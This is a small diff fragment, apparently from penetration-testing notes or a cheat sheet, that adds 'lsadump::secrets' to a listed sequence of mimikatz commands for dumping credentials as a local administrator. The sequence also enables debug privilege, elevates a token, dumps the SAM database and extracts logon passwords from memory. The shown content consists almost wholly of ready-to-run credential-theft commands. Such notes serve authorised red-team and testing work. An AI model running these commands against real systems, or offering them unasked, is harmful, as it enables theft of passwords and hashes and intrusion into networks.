@@ -248,6 +248,7 @@ mimikatz dump as local admin:
 privilege::debug
 token::elevate
 lsadump::sam
+lsadump::secrets
 sekurlsa::logonpasswords
 ```
 
